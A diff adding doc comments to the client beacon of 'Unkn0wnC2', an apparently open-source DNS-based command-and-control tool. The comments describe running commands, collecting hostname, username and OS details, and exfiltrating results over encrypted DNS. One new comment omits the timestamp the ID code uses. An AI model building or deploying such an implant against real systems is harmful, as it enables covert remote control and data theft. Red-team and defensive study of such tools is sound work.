@@ -1,3 +1,6 @@
+// Package main implements the Unkn0wnC2 DNS-based Command & Control client beacon.
+// This client establishes communication with the C2 server through DNS queries,
+// executes commands, and exfiltrates results using encrypted DNS traffic.
 package main
 
 import (
@@ -25,6 +28,8 @@ type Beacon struct {
 }
 
 // newBeacon creates a new DNS beacon with embedded configuration
+// newBeacon creates a new beacon instance with system information
+// including hostname, username, and operating system details.
 func newBeacon() (*Beacon, error) {
 	client := newDNSClient()
 
@@ -53,6 +58,8 @@ func newBeacon() (*Beacon, error) {
 }
 
 // generateBeaconID creates a unique ID for this beacon
+// generateBeaconID creates a unique 4-character beacon identifier
+// based on MD5 hash of the hostname for C2 tracking.
 func generateBeaconID(hostname string) string {
 	hash := md5.Sum([]byte(hostname + fmt.Sprintf("%d", time.Now().Unix())))
 	return fmt.Sprintf("%x", hash)[:4]
